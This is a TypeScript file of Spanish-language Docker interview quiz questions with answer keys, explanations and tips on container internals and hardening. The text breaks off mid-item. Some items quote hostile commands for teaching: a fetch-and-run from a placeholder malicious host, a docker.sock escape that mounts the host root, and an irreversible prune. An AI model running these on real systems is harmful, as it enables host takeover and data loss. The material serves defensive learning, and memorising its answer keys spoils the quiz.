import { Question } from '../types/quiz';

export const DOCKER_MASTERY_QUESTIONS: Question[] = [
  // ==================== DOCKER DEEP-DIVE & INTERNALS (25+ Preguntas) ====================
  {
    id: 'doc-01',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: '¿Cuáles son los dos pilares fundamentales del kernel de Linux sobre los cuales Docker construye el aislamiento y control de los contenedores?',
    codeSnippet: `// Aislamiento de vista vs Control de recursos
ls -l /proc/$$/ns/ # Linux Namespaces
cat /sys/fs/cgroup/memory.max # Cgroups v2`,
    codeLanguage: 'bash',
    options: [
      'Linux Namespaces (para aislamiento de visibilidad: PID, NET, MNT, IPC, UTS, USER) y Control Groups / Cgroups (para limitación y medición de recursos: CPU, Memoria, I/O).',
      'KVM (Kernel-based Virtual Machine) y QEMU.',
      'Selinux y eBPF exclusivamente.',
      'Hyper-V containers y WSL2.'
    ],
    correctAnswerIndex: 0,
    explanation: 'Un contenedor no es una máquina virtual; es un proceso estándar de Linux. Los Namespaces crean la ilusión de un entorno dedicado (cada contenedor ve solo sus propios PIDs, interfaces de red, puntos de montaje y usuarios), mientras que Cgroups v1/v2 limitan la cantidad de memoria, CPU, I/O y número de procesos que ese grupo puede consumir.',
    proTip: 'En entrevistas, enfatiza: "Un contenedor es un proceso confinado por cgroups, aislado por namespaces y restringido por seccomp/capabilities; no hay hipervisor".'
  },
  {
    id: 'doc-02',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: 'En el driver de almacenamiento Overlay2, ¿cómo interactúan los directorios "lowerdir", "upperdir" y "merged" cuando un contenedor modifica un archivo de una imagen base?',
    codeSnippet: `mount -t overlay overlay \\
  -o lowerdir=/var/lib/docker/overlay2/l/base,upperdir=/app/upper,workdir=/app/work \\
  /app/merged`,
    codeLanguage: 'bash',
    options: [
      '"lowerdir" es de solo lectura (las capas de la imagen); "upperdir" es la capa de lectura/escritura del contenedor; al modificar un archivo, Overlay2 hace "Copy-on-Write" (CoW) copiando el archivo desde lowerdir a upperdir antes de escribir.',
      '"lowerdir" se sobreescribe directamente en disco para ahorrar espacio.',
      '"upperdir" se borra cada 5 minutos por el daemon de Docker.',
      '"merged" es una partición de swap temporal en memoria RAM.'
    ],
    correctAnswerIndex: 0,
    explanation: 'Overlay2 monta las capas de la imagen como "lowerdir" (inmutables y de solo lectura). Al arrancar el contenedor, se crea "upperdir" (capa rw). Si un proceso modifica un archivo existente de 100 MB, el kernel primero copia todo el archivo desde lowerdir a upperdir (Copy-on-Write) y luego aplica el cambio, lo que introduce una penalización de I/O en la primera escritura de archivos grandes.',
    proTip: 'Por esta razón de Copy-on-Write, las bases de datos (Postgres, MySQL) y operaciones de I/O intensivas NUNCA deben escribir en el filesystem del contenedor; deben usar volúmenes de Docker montados directamente.'
  },
  {
    id: 'doc-03',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'find_the_bug',
    title: '¿Por qué incluir un token secreto de GitHub en una variable ARG dentro de un Dockerfile clásico expone la credencial en producción incluso si se borra en un RUN posterior?',
    codeSnippet: `FROM node:20
ARG GITHUB_TOKEN
RUN git clone https://\${GITHUB_TOKEN}@github.com/empresa/privado.git
RUN unset GITHUB_TOKEN # Intento de limpiarlo`,
    codeLanguage: 'dockerfile',
    options: [
      'Los valores de ARG y las capas intermedias quedan grabados permanentemente en los metadatos de la imagen y en el historial accesible con "docker history" o extrayendo el tar de la imagen.',
      'El comando "unset" solo funciona en Windows.',
      'Git rechaza clonar repositorios con tokens en la URL.',
      'Node.js 20 desactiva la lectura de variables ARG.'
    ],
    correctAnswerIndex: 0,
    explanation: 'Cualquiera con acceso a la imagen puede ejecutar "docker history --no-trunc <imagen>" o "docker inspect" y ver los valores de ARG pasados durante la compilación. Además, los archivos creados en una capa previa permanecen en esa capa aunque se borren en un "RUN" posterior.',
    proTip: 'La forma moderna y segura con BuildKit es usar secretos de compilación: "RUN --mount=type=secret,id=gh_token TOKEN=$(cat /run/secrets/gh_token) ...", lo cual no deja ningún rastro en las capas de la imagen.'
  },
  {
    id: 'doc-04',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: '¿Cuál es la diferencia de resolución DNS entre la red bridge por defecto ("bridge") y una red bridge creada por el usuario ("docker network create mi-red")?',
    codeSnippet: `docker run --name app1 --network bridge mi-img
docker run --name app2 --network mi-red mi-img`,
    codeLanguage: 'bash',
    options: [
      'En las redes bridge creadas por el usuario, Docker proporciona resolución DNS automática por nombre de contenedor (ej. "ping app2"); en la red bridge por defecto, la resolución DNS por nombre está desactivada y solo se pueden comunicar por dirección IP (a menos que se use el obsoleto --link).',
      'La red bridge por defecto es más rápida porque no usa iptables.',
      'Las redes creadas por el usuario requieren obligatoriamente túneles VPN.',
      'No hay ninguna diferencia técnica.'
    ],
    correctAnswerIndex: 0,
    explanation: 'El embedded DNS server de Docker (en 127.0.0.11 dentro del contenedor) solo está activo en "user-defined networks". En la red bridge por defecto (docker0), Docker deshabilita la resolución de nombres por razones de retrocompatibilidad histórica, obligando a usar IPs crudas o el flag legado "--link".',
    proTip: 'Nunca uses la red bridge por defecto en producción ni en desarrollo. Siempre crea una red dedicada con "docker network create" o mediante Docker Compose.'
  },
  {
    id: 'doc-05',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: '¿Qué es una imagen "Distroless" (ej. gcr.io/distroless/nodejs20-debian12) y qué ventajas de seguridad radicales aporta en producción?',
    codeSnippet: `FROM node:20-alpine AS build
WORKDIR /app
COPY . .
RUN npm ci && npm run build

FROM gcr.io/distroless/nodejs20-debian12
WORKDIR /app
COPY --from=build /app/dist ./dist
CMD ["dist/index.js"]`,
    codeLanguage: 'dockerfile',
    options: [
      'Contiene únicamente la aplicación y sus dependencias estrictas de runtime; no contiene gestor de paquetes (apt, apk), ni shells (/bin/sh, /bin/bash), ni binarios de utilidades comunes (curl, wget), reduciendo la superficie de ataque y los CVEs a casi cero.',
      'Es una imagen que se ejecuta sin procesador CPU usando WebAssembly.',
      'Es una distribución de Linux experimental creada por el MIT para computación cuántica.',
      'Es una imagen que no requiere Docker para ejecutarse.'
    ],
    correctAnswerIndex: 0,
    explanation: 'Distroless elimina todo lo innecesario para ejecutar tu código compilado. Al carecer de shell y de administradores de paquetes, si un atacante logra ejecución remota de código (RCE) en tu app, no puede ejecutar "curl malicious.com | sh", ni instalar paquetes, ni spawnear una reverse shell tradicional, frustrando la mayoría de los vectores de ataque.',
    proTip: 'Para depurar un contenedor distroless en desarrollo, puedes usar "docker debug <container_id>" (Docker Desktop reciente) o conectar un contenedor efímero a sus namespaces de red y procesos.'
  },
  {
    id: 'doc-06',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: '¿Por qué la directiva ".dockerignore" es crucial para el rendimiento de compilación y qué problema grave evita?',
    codeSnippet: `# .dockerignore
.git
node_modules
dist
*.log
.env*`,
    codeLanguage: 'text',
    options: [
      'Evita que Docker envíe el "Build Context" innecesariamente pesado (como la carpeta .git o gigabytes de node_modules locales) a través del socket al daemon, y previene la fuga accidental de secretos (.env).',
      'Desactiva el escaneo antivirus durante el arranque del contenedor.',
      'Comprime los archivos en formato zip antes de guardarlos en caché.',
      'Obliga a Docker a ignorar los errores de TypeScript en compilación.'
    ],
    correctAnswerIndex: 0,
    explanation: 'Antes de que se ejecute la primera línea de un Dockerfile, el cliente empaqueta todo el directorio actual (Build Context) y lo envía al daemon. Si no excluyes ".git" o "node_modules", puedes estar transfiriendo cientos de megabytes o gigabytes en cada compilación, además del riesgo crítico de incluir credenciales de archivos ".env" en la imagen.',
    proTip: 'Siempre incluye ".git" en tu .dockerignore. Además de pesar mucho, cada commit cambia los archivos en .git, lo que invalidaría la caché de cualquier "COPY . ." posterior.'
  },
  {
    id: 'doc-07',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: '¿Qué sucede si un contenedor excede el límite de memoria configurado con "--memory 512m" en Linux?',
    codeSnippet: `docker run -d --name cache-app --memory=512m --memory-swap=512m redis:alpine`,
    codeLanguage: 'bash',
    options: [
      'El kernel de Linux ejecuta el OOM Killer (Out Of Memory Killer) y termina el proceso del contenedor inmediatamente con un código de salida 137 (128 + SIGKILL 9).',
      'El contenedor reduce automáticamente la frecuencia de su reloj de CPU.',
      'Docker pausa el contenedor y lo reanuda cuando se libera memoria en el host.',
      'La memoria restante se descarga automáticamente en Amazon S3.'
    ],
    correctAnswerIndex: 0,
    explanation: 'Cuando los cgroups detectan que el consumo de memoria excede el límite configurado (y no hay swap disponible o el swap también se agotó con --memory-swap=512m), el cgroup invoca al OOM Killer del kernel, el cual envía SIGKILL (señal 9) al proceso con mayor oom_score_adj. En docker inspect, se reflejará como "OOMKilled: true" y ExitCode 137.',
    proTip: 'Verifica si tus contenedores han muerto por OOM inspeccionando "docker inspect <container> --format \'{{.State.OOMKilled}}\'".'
  },
  {
    id: 'doc-08',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: '¿Cuál es la diferencia entre montar un volumen con el flag ":z" vs ":Z" en sistemas con SELinux activo (como RHEL, Fedora, CentOS)?',
    codeSnippet: `docker run -v /data/shared:/data:z mi-app # vs
docker run -v /data/private:/data:Z mi-app`,
    codeLanguage: 'bash',
    options: [
      '":z" aplica una etiqueta SELinux compartida (svirt_sandbox_file_t) permitiendo que múltiples contenedores compartan el volumen; ":Z" aplica una etiqueta privada exclusiva y única, impidiendo que cualquier otro contenedor acceda al directorio.',
      '":z" comprime los datos con algoritmo zip; ":Z" los cifra con RSA.',
      '":z" es de solo lectura y ":Z" es de lectura/escritura.',
      'Son banderas idénticas introducidas por redundancia.'
    ],
    correctAnswerIndex: 0,
    explanation: 'SELinux previene que procesos confinados en contenedores accedan a archivos del sistema anfitrión a menos que tengan el contexto de seguridad correcto. El modificador ":z" reetiqueta el directorio con un contexto compartido por todos los contenedores. El modificador ":Z" lo reetiqueta con un MCS (Multi-Category Security) único y exclusivo para ese contenedor en particular.',
    proTip: '¡Cuidado con ":Z"! Nunca uses ":Z" sobre directorios del sistema como /home o /var/log, ya que romperá el acceso para el resto de servicios del sistema operativo host.'
  },
  {
    id: 'doc-09',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'find_the_bug',
    title: '¿Por qué la instrucción RUN de este Dockerfile NO reduce el tamaño de la imagen final a pesar de ejecutar "rm -rf"?',
    codeSnippet: `FROM ubuntu:22.04
RUN apt-get update && apt-get install -y build-essential
RUN rm -rf /var/lib/apt/lists/*`,
    codeLanguage: 'dockerfile',
    options: [
      'Al ejecutarse en un "RUN" separado, crea una nueva capa de Overlay2 donde los archivos se marcan como eliminados (whiteout), pero los datos binarios siguen ocupando espacio en la capa anterior inmutable.',
      'Ubuntu 22.04 no soporta la eliminación de paquetes por CLI.',
      'El comando "rm -rf" no funciona con asteriscos dentro de Docker.',
      'Se requiere reiniciar el daemon de Docker para que se aplique la reducción.'
    ],
    correctAnswerIndex: 0,
    explanation: 'Cada directiva RUN genera una capa independiente inmutable. Si instalas paquetes en una capa y los limpias en la siguiente capa, la primera capa conserva todos los megabytes de los paquetes descargados. Para optimizar el tamaño, la instalación y la limpieza deben combinarse en una sola instrucción RUN encadenada con "&&": "RUN apt-get update && apt-get install -y build-essential && rm -rf /var/lib/apt/lists/*".',
    proTip: 'Utiliza linters de Dockerfiles como Hadolint en tu pipeline de CI para detectar automáticamente capas divididas y advertencias de seguridad.'
  },
  {
    id: 'doc-10',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: 'Para endurecer al máximo la seguridad de un contenedor en producción (Principio de Menor Privilegio), ¿qué combinación de flags de Docker CLI se considera estándar de oro?',
    codeSnippet: `docker run -d \\
  --cap-drop=ALL \\
  --cap-add=NET_BIND_SERVICE \\
  --read-only \\
  --tmpfs /tmp:rw,noexec,nosuid,size=64m \\
  --security-opt=no-new-privileges:true \\
  --user 10001:10001 \\
  mi-web-server`,
    codeLanguage: 'bash',
    options: [
      'Descartar todas las Linux Capabilities (--cap-drop=ALL), montar el sistema de archivos raíz como solo lectura (--read-only), usar tmpfs efímero con noexec para archivos temporales, bloquear escalamiento de privilegios (--security-opt=no-new-privileges) y correr con UID no-root.',
      'Ejecutar con "--privileged" para permitir que Docker administre la memoria directamente.',
      'Desactivar AppArmor y SELinux con "--security-opt unconfined".',
      'Asignar el contenedor a la red host con "--net=host".'
    ],
    correctAnswerIndex: 0,
    explanation: 'Esta combinación mitiga la inmensa mayoría de ataques: un atacante no puede modificar binarios ni inyectar código en el filesystem raíz (--read-only), no puede ganar privilegios adicionales (no-new-privileges), no puede ejecutar binarios en /tmp (noexec en tmpfs), y carece de capacidades del kernel para alterar redes, montar discos o rastrear procesos (--cap-drop=ALL).',
    proTip: 'Si tu servicio necesita vincularse a un puerto inferior a 1024 (ej. 80 o 443) sin ser root, agrega únicamente la capacidad "--cap-add=NET_BIND_SERVICE".'
  },
  {
    id: 'doc-11',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: '¿Qué diferencia existe entre "docker exec" y "docker run"?',
    codeSnippet: `docker run -it alpine sh # vs
docker exec -it mi-alpine-activo sh`,
    codeLanguage: 'bash',
    options: [
      '"docker run" crea e inicializa un nuevo contenedor desde cero a partir de una imagen; "docker exec" ejecuta un nuevo proceso dentro de los namespaces de un contenedor que YA está en ejecución.',
      '"docker exec" se ejecuta en el servidor remoto y "docker run" en local.',
      '"docker exec" compila el código antes de lanzarlo.',
      'Son sinónimos intercambiables.'
    ],
    correctAnswerIndex: 0,
    explanation: '"docker run" instancia un nuevo ciclo de vida de contenedor (crea nuevos cgroups, namespaces y capa de escritura Overlay2). En cambio, "docker exec" utiliza la llamada al sistema "setns()" del kernel de Linux para unir un nuevo proceso a los namespaces existentes del contenedor que ya está corriendo.',
    proTip: 'Usa "docker exec" exclusivamente para tareas de introspección, depuración o comandos administrativos temporales, nunca como mecanismo principal para correr tareas batch de producción.'
  },
  {
    id: 'doc-12',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: '¿Por qué los logs de Docker en un servidor de producción pueden saturar el disco duro al 100% y cómo se previene en "/etc/docker/daemon.json"?',
    codeSnippet: `// /etc/docker/daemon.json
{
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "100m",
    "max-file": "5"
  }
}`,
    codeLanguage: 'json',
    options: [
      'Por defecto, el driver "json-file" no tiene límite de tamaño ni rotación, acumulando stdout/stderr indefinidamente en /var/lib/docker/containers/; se previene configurando "max-size" y "max-file" para activar rotación automática.',
      'Porque Docker guarda un volcado de memoria (core dump) de cada paquete TCP.',
      'Porque las imágenes de Docker crecen de tamaño a medida que pasa el tiempo.',
      'Se soluciona deshabilitando el comando "console.log" en JavaScript.'
    ],
    correctAnswerIndex: 0,
    explanation: 'El driver por defecto de Docker escribe todos los logs en un archivo JSON plano en el host. Sin rotación explícita, una aplicación ruidosa puede generar cientos de gigabytes hasta agotar los inodos o el espacio del disco, provocando caídas en cascada. Configurar "max-size: 100m" y "max-file: 5" garantiza que nunca se utilicen más de 500 MB en logs por contenedor.',
    proTip: 'En entornos de producción distribuidos, es aún mejor enviar los logs a un recolector externo como Fluentbit, Loki o Datadog usando el driver "fluentd", "syslog" o "awslogs".'
  },
  {
    id: 'doc-13',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: 'En Docker Compose v2, ¿cómo configuras un servicio para que espere a que su base de datos esté lista y acepte conexiones (Healthcheck) antes de arrancar, en vez de solo esperar a que el contenedor se inicie?',
    codeSnippet: `services:
  web:
    image: mi-app
    depends_on:
      db:
        condition: service_healthy
  db:
    image: postgres:16
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U postgres"]
      interval: 5s
      timeout: 5s
      retries: 5`,
    codeLanguage: 'yaml',
    options: [
      'Configurando "depends_on" con "condition: service_healthy", requiriendo que el servicio dependiente pase exitosamente su test de "healthcheck".',
      'Añadiendo "sleep 60" en el comando de inicio de la aplicación web.',
      'Docker Compose espera automáticamente a que los puertos de red estén abiertos.',
      'Usando la propiedad "wait_for_ports: [5432]".'
    ],
    correctAnswerIndex: 0,
    explanation: 'El "depends_on" básico solo espera a que el contenedor esté en estado RUNNING (es decir, que el proceso arrancó), pero servicios como PostgreSQL o MySQL tardan varios segundos en inicializar el catálogo y aceptar clientes. La condición "service_healthy" retrasa el arranque del servicio web hasta que el healthcheck devuelva código de salida 0.',
    proTip: 'Para proyectos sin healthcheck nativo, puedes implementar healthchecks con curl/wget ("test: [\'CMD\', \'curl\', \'-f\', \'http://localhost:8080/health\']").'
  },
  {
    id: 'doc-14',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: '¿Qué es "Rootless Docker" y qué ventaja fundamental de seguridad ofrece contra vulnerabilidades de escape de contenedor (Zero-Day exploits en runc)?',
    codeSnippet: `# Instalación y arranque de Docker en espacio de usuario
dockerd-rootless-setuptool.sh install
systemctl --user start docker`,
    codeLanguage: 'bash',
    options: [
      'Permite ejecutar tanto el daemon de Docker (dockerd) como los contenedores dentro de un User Namespace sin privilegios de root (UID != 0) en el host, eliminando el riesgo de que un escape del contenedor tome el control de la máquina host.',
      'Permite ejecutar contenedores sin necesidad de instalar Linux.',
      'Es un comando especial para ejecutar Docker en modo solo lectura.',
      'Permite ejecutar Docker en dispositivos móviles Android sin root.'
    ],
    correctAnswerIndex: 0,
    explanation: 'En el modo Rootless, incluso si un atacante es root (UID 0) dentro del contenedor y logra una falla de escape del runtime (como CVE-2019-5736 en runc), en el sistema host solo es un usuario normal sin privilegios (ej. UID 1000). No puede modificar archivos del kernel, ni instalar módulos, ni acceder a /etc/shadow.',
    proTip: 'En modo Rootless, el kernel no permite vincular puertos privilegiados (< 1024) por defecto a menos que configures "sysctl net.ipv4.ip_unprivileged_port_start=80".'
  },
  {
    id: 'doc-15',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'find_the_bug',
    title: '¿Por qué este contenedor tarda exactamente 10 segundos en responder a "docker stop" antes de apagarse abruptamente con Exit Code 137?',
    codeSnippet: `FROM python:3.11-slim
WORKDIR /app
COPY app.py .
CMD python app.py # Nota: formato Shell en vez de Exec`,
    codeLanguage: 'dockerfile',
    options: [
      'Al usar el formato Shell ("CMD python app.py"), Docker ejecuta "/bin/sh -c" como PID 1. La shell /bin/sh no reenvía las señales del sistema operativo (SIGTERM) al proceso hijo de Python, provocando un timeout de 10s hasta que Docker envía SIGKILL.',
      'Python requiere compilarse con Cython para recibir señales del sistema operativo.',
      'El flag "-slim" de Python elimina la librería de sockets de Linux.',
      'Docker stop solo es compatible con aplicaciones escritas en Go.'
    ],
    correctAnswerIndex: 0,
    explanation: 'La sintaxis shell ("CMD comando arg") envuelve el comando en "/bin/sh -c". En Linux, /bin/sh no propaga señales a los procesos hijos. Al recibir "SIGTERM" de "docker stop", la shell lo ignora, tu app de Python nunca se entera para hacer graceful shutdown, se alcanza el timeout de 10 segundos y Docker termina matando el contenedor con SIGKILL.',
    proTip: 'Usa siempre el formato Exec con corchetes JSON: \'CMD ["python", "app.py"]\' o \'ENTRYPOINT ["python", "app.py"]\'.'
  },
  {
    id: 'doc-16',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: '¿Cuál es la función del comando "docker diff <container_id>" al realizar análisis forense o debugging de un contenedor?',
    codeSnippet: `docker diff mi-contenedor
C /etc
C /etc/hosts
A /tmp/payload.sh
D /var/log/app.log`,
    codeLanguage: 'text',
    options: [
      'Muestra todos los cambios en el sistema de archivos del contenedor en comparación con su imagen base: A (Añadido), C (Cambiado) y D (Eliminado).',
      'Compara el consumo de CPU entre dos contenedores activos.',
      'Calcula la diferencia de versiones entre el daemon local y Docker Hub.',
      'Genera un parche git entre dos imágenes distintas.'
    ],
    correctAnswerIndex: 0,
    explanation: '"docker diff" inspecciona la capa superior escribible (upperdir) del contenedor y reporta cada archivo que fue modificado (C), creado (A) o eliminado (D) desde que el contenedor fue instanciado a partir de la imagen original. Es invaluable en incidentes de seguridad para identificar malware o archivos temporales no deseados.',
    proTip: 'En un contenedor correctamente configurado con "--read-only", "docker diff" no debería reportar casi ninguna modificación fuera de los volúmenes montados.'
  },
  {
    id: 'doc-17',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: '¿Cómo compilas una imagen compatible tanto con procesadores Intel/AMD (x86_64) como con Apple Silicon / AWS Graviton (ARM64) usando Docker Buildx?',
    codeSnippet: `docker buildx create --name multibuilder --use
docker buildx build \\
  --platform linux/amd64,linux/arm64 \\
  -t mi-registro.com/app:v1.0.0 \\
  --push .`,
    codeLanguage: 'bash',
    options: [
      'Creando una instancia de buildx con soporte multi-nodo o emulación QEMU y usando "--platform linux/amd64,linux/arm64 --push" para generar un OCI Image Index (manifiesto múltiple).',
      'Cambiando la extensión del Dockerfile a ".multi".',
      'No es posible; se debe crear un Dockerfile completamente diferente por cada arquitectura.',
      'Compilando la imagen en una máquina virtual de Windows.'
    ],
    correctAnswerIndex: 0,
    explanation: 'Buildx soporta emulación mediante QEMU o nodos constructores remotos. Al pasar múltiples plataformas ("--platform linux/amd64,linux/arm64"), compila ambas variantes y crea un "Manifest List" en el registro de destino, de modo que cuando un servidor ARM64 o un servidor AMD64 ejecuta "docker pull", descarga automáticamente la variante nativa correspondiente a su arquitectura.',
    proTip: 'El flag "--push" es obligatorio en builds multi-arquitectura porque el motor de Docker local clásico no puede almacenar más de una arquitectura simultáneamente bajo el mismo tag en su daemon tradicional.'
  },
  {
    id: 'doc-18',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: '¿Qué es el modo de red "host" ("--net=host") y cuándo es indispensable a pesar de romper el aislamiento de red?',
    codeSnippet: `docker run -d --name proxy --net=host envoyproxy/envoy:v1.28`,
    codeLanguage: 'bash',
    options: [
      'El contenedor comparte directamente el namespace de red del host: no tiene su propia IP ni pasa por NAT/iptables; se utiliza para proxys de ultra-alto rendimiento o monitoreo de red para eliminar la sobrecarga de traducción de paquetes (NAT overhead).',
      'Permite conectar el contenedor a internet sin usar un módem.',
      'Hace que el contenedor se ejecute únicamente en la memoria caché L3 del CPU.',
      'Es el único modo compatible con Docker Swarm.'
    ],
    correctAnswerIndex: 0,
    explanation: 'Con "--net=host", el contenedor no obtiene una interfaz virtual veth ni una IP propia; se vincula directamente a las interfaces físicas del host (eth0, lo). Esto elimina por completo el overhead de conmutación de iptables y NAT de la red bridge, ofreciendo rendimiento de red idéntico al metal puro.',
    proTip: 'Ten en cuenta que en "--net=host", el mapeo de puertos (-p 8080:80) se ignora; el servicio se vincula directamente al puerto en el host, por lo que no puedes correr dos contenedores en el mismo puerto.'
  },
  {
    id: 'doc-19',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: '¿Qué comando de Docker permite limpiar de un solo golpe todos los contenedores detenidos, redes no utilizadas, imágenes intermedias colgantes y la caché de BuildKit?',
    codeSnippet: `docker system prune -a --volumes`,
    codeLanguage: 'bash',
    options: [
      '"docker system prune -a --volumes", que elimina todos los contenedores detenidos, imágenes no asociadas a ningún contenedor en ejecución, redes no usadas y volúmenes huérfanos.',
      '"docker clear --all".',
      '"rm -rf /var/lib/docker" con el daemon en marcha.',
      '"docker uninstall --clean".'
    ],
    correctAnswerIndex: 0,
    explanation: '"docker system prune" limpia recursos no utilizados. El flag "-a" (all) extiende la limpieza para eliminar también imágenes que no tienen contenedores activos asociados (no solo dangling), y "--volumes" remueve los volúmenes anónimos que quedaron huérfanos tras borrar contenedores.',
    proTip: '¡Extrema precaución con "--volumes" en producción! Si tienes bases de datos con volúmenes que no están actualmente adjuntos a un contenedor en ejecución, este comando los eliminará de forma irreversible.'
  },
  {
    id: 'doc-20',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: '¿Cómo permite Docker montar el socket del daemon ("/var/run/docker.sock") dentro de un contenedor y por qué es equivalente a otorgar acceso root sin restricciones a toda la máquina host?',
    codeSnippet: `docker run -v /var/run/docker.sock:/var/run/docker.sock mi-herramienta-ci`,
    codeLanguage: 'bash',
    options: [
      'Al tener acceso directo a la API de Docker mediante el socket Unix, cualquier proceso dentro del contenedor puede ordenar al daemon host crear un nuevo contenedor con "--privileged" montando la raíz "/" del host y tomar control total del servidor.',
      'El socket de Docker está encriptado con TLS y solo permite comandos de solo lectura.',
      'Solo expone la lista de nombres de contenedores sin permisos de ejecución.',
      'Es un método seguro recomendado por el estándar CIS Benchmark.'
    ],
    correctAnswerIndex: 0,
    explanation: 'El socket Unix "/var/run/docker.sock" es el punto de control absoluto del daemon de Docker. Si un contenedor tiene montado este socket, puede enviar un payload a la API ordenando: "docker run -v /:/host-root alpine chroot /host-root", adquiriendo acceso root irrestricto sobre todo el sistema de archivos del sistema anfitrión.',
    proTip: 'En pipelines de CI/CD, evita el patrón Docker-out-of-Docker montando el socket. Utiliza herramientas modernas sin privilegios para compilar imágenes, como Kaniko, Buildah o contenedores Sysbox.'
  },
  {
    id: 'doc-21',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: '¿Cuál es la diferencia fundamental entre un "Named Volume" y un "Bind Mount" en Docker?',
    codeSnippet: `docker run -v datos_db:/var/lib/postgresql/data mi-db # Named Volume
docker run -v /home/usuario/app:/app mi-app # Bind Mount`,
    codeLanguage: 'bash',
    options: [
      'Los "Named Volumes" son gestionados completamente por Docker en su directorio interno (/var/lib/docker/volumes/), son independientes del SO host y fáciles de respaldar; los "Bind Mounts" mapean una ruta explícita del filesystem del host y dependen de la estructura de carpetas y permisos del host.',
      'Los Bind Mounts se guardan en la memoria RAM y los Named Volumes en el disco SSD.',
      'Los Named Volumes son de solo lectura y los Bind Mounts de lectura/escritura.',
      'Los Bind Mounts solo funcionan en Windows.'
    ],
    correctAnswerIndex: 0,
    explanation: 'Los volúmenes nombrados abstraen el almacenamiento del host: Docker gestiona su ciclo de vida, permisos de usuario y migración entre entornos. Los bind mounts dependen de una ruta rígida del host anfitrión y a menudo causan dolores de cabeza por discrepancias de UID/GID entre el usuario de tu laptop y el usuario del contenedor.',
    proTip: 'Usa Bind Mounts para desarrollo local (sincronizar código fuente en vivo con hot-reload); usa Named Volumes para persistencia de datos (bases de datos, uploads) en producción.'
  },
  {
    id: 'doc-22',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: 'En un contenedor con Alpine Linux o Debian, ¿por qué es crítico ejecutar "set -e" o verificar códigos de retorno en scripts de ENTRYPOINT personalizados?',
    codeSnippet: `#!/bin/sh
set -e # ¿Por qué es indispensable?
# Tareas de migración de base de datos
npm run db:migrate
exec "$@"`,
    codeLanguage: 'bash',
    options: [
      '"set -e" asegura que el script termine inmediatamente si cualquier comando falla; sin él, si las migraciones fallan, el script continuará ciegamente y levantará el servidor web con una base de datos corrupta o desactualizada.',
      '"set -e" activa el soporte para emojis en los logs del contenedor.',
      'Sin "set -e", el shell no puede interpretar la instrucción "exec".',
      'Es una directiva obligatoria para que el script sea ejecutable con chmod +x.'
    ],
    correctAnswerIndex: 0,
    explanation: 'En scripts de shell POSIX, los comandos que fallan continúan ejecutándose por defecto a menos que se use "set -e". Además, la última línea "exec \'$@\'" reemplaza el proceso del script por el comando final de la aplicación, transfiriéndole el PID 1 para que reciba las señales del sistema operativo adecuadamente.',
    proTip: 'La combinación recomendada en scripts entrypoint de Linux es "set -euo pipefail" para atrapar errores, variables no declaradas y fallos en pipes.'
  },
  {
    id: 'doc-23',
    categoryId: 'docker_mastery',
    categoryName: 'Docker & Containers Mastery',
    difficulty: 'Senior',
    type: 'multiple_choice',
    title: '¿Qué es "Docker Content Trust" (DCT) y cómo garantiza que una imagen no fue alterada ni suplantada en el registro?',
    codeSnippet: `export DOCKER_CONTENT_TRUST=1
docker pull mi-empresa/core-api:1.0.0`,
    codeLanguage: 'bash',
    options: [
      'Utiliza firmas criptográficas digitales con llaves públicas/privadas (mediante The Update Framework / Notary); si "DOCKER_CONTENT_TRUST=1" está activo, Docker rechaza descargar o ejecutar cualquier imagen que no esté debidamente firmada por un publicador de confianza.',
      'Verifica la tarjeta de crédito del usuario en Docker Hub antes de descargar.',
      'Escanea la imagen con un antivirus en la nube de Microsoft Defender.',
      'Obliga a que el nombre del autor coincida con el correo del desarrollador.'
    ],
    correctAnswerIndex: 0,
